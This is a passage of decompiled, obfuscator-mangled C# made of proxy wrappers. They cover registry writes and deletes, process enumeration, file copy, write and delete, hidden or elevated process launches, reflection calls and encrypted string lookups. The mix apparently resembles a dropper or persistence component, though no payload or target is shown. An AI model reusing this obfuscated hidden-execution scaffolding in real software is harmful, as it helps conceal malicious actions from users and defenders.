  internal static object \u0040ӝ(object _param0, object _param1, object _param2) => (object) ((string) _param0 + (string) _param1 + (string) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӟ(object _param0, object _param1, object _param2) => ((RegistryKey) _param0).SetValue((string) _param1, _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӟ(object _param0) => ((IDisposable) _param0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӡ(object _param0, object _param1) => ((RegistryKey) _param0).GetValue((string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӡ(object _param0, object _param1, object _param2, object _param3) => (object) ((string) _param0 + (string) _param1 + (string) _param2 + (string) _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӣ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӣ() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӥ(object _param0) => (object) Path.GetDirectoryName((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӥ(object _param0) => (object) Path.GetFileName((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӧ(object _param0, int _param1, int _param2) => (object) ((string) _param0).Substring(_param1, _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӧ(object _param0) => File.Exists((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ө() => (object) Process.GetProcesses();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ө(object _param0) => (object) ((Process) _param0).ProcessName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӫ() => (object) Environment.SystemDirectory;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӫ(object _param0) => (object) Path.GetPathRoot((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӭ(object _param0, object _param1, bool _param2) => File.Copy((string) _param0, (string) _param1, _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӭ(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӯ(object _param0, object _param1) => File.WriteAllText((string) _param0, (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӯ(int _param0, object _param1) => \u0040Ԟ.\u0040ӕ(_param0, _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӱ(object _param0) => ((string) _param0).Length;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӱ(object _param0) => (object) Directory.GetFiles((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӳ(object _param0) => Directory.Exists((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӳ(object _param0) => (object) Directory.CreateDirectory((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӵ(object _param0, object _param1, object _param2) => (object) ((string) _param0).Replace((string) _param1, (string) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӵ(object _param0) => (object) _param0.\u0040ӓ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӷ(object _param0, object _param1, object _param2) => ((MethodBase) _param0).Invoke(_param1, (object[]) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ӷ(object _param0) => ((List<string>) _param0).Count;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӹ(object _param0, object _param1, object _param2) => File.WriteAllText((string) _param0, (string) _param1, (Encoding) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӹ(object _param0, ProcessWindowStyle _param1) => ((ProcessStartInfo) _param0).WindowStyle = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӻ(object _param0, object _param1) => ((ProcessStartInfo) _param0).Verb = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӻ(object _param0, bool _param1) => ((ProcessStartInfo) _param0).UseShellExecute = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӽ(object _param0, object _param1) => ((ProcessStartInfo) _param0).FileName = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӽ(object _param0) => (object) Process.Start((ProcessStartInfo) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӿ(int _param0) => Environment.Exit(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӿ(object _param0, object _param1) => ((ProcessStartInfo) _param0).Arguments = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ԁ(object _param0, bool _param1) => ((ProcessStartInfo) _param0).CreateNoWindow = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ԁ(object _param0) => ((Process) _param0).WaitForExit();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ԃ(object _param0, object _param1) => ((RegistryKey) _param0).DeleteValue((string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ԃ(object _param0) => File.Delete((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ԅ() => \u0040ո.\u0040Ӕ();

  [Serializable]
  internal sealed class C6N0wsdgsDZmYJwJVBB
  {
    public static readonly object ATpfujJOl6;
    public static Predicate<string> ef9fy9QpIA;
    public static Predicate<string> Dc5fgJCFlO;

    [MethodImpl(MethodImplOptions.NoInlining)]
    static C6N0wsdgsDZmYJwJVBB()
    {
      \u0040Ԟ.C6N0wsdgsDZmYJwJVBB.VUVYirvKeK4HB7B5MaH();
      \u0040Ԟ.C6N0wsdgsDZmYJwJVBB.ATpfujJOl6 = (object) new \u0040Ԟ.C6N0wsdgsDZmYJwJVBB();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public C6N0wsdgsDZmYJwJVBB()
    {
      \u0040Ԟ.C6N0wsdgsDZmYJwJVBB.VUVYirvKeK4HB7B5MaH();
      \u0040Ԟ.C6N0wsdgsDZmYJwJVBB.qNqKY5vrujhUSwA1EDN((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal bool Y3tfZMmXIM(string _param1) => \u0040Ԟ.C6N0wsdgsDZmYJwJVBB.CvMVrTvPTanLkS7aqXb((object) _param1, \u0040Ԟ.C6N0wsdgsDZmYJwJVBB.FvWXs4vepdsHQUBI0Mt(589984));

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal bool yvsfkfBnBo(string _param1) => \u0040Ԟ.C6N0wsdgsDZmYJwJVBB.CvMVrTvPTanLkS7aqXb((object) _param1, \u0040Ԟ.C6N0wsdgsDZmYJwJVBB.FvWXs4vepdsHQUBI0Mt(589984));

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void VUVYirvKeK4HB7B5MaH() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool pwTkT6v8RpTUs8ffrEK() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool aj7oSpvL6EUqekA4IE1() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void qNqKY5vrujhUSwA1EDN([In] object obj0) => obj0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object FvWXs4vepdsHQUBI0Mt(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool CvMVrTvPTanLkS7aqXb([In] object obj0, [In] object obj1) => ((string) obj0).Contains((string) obj1);
  }
}
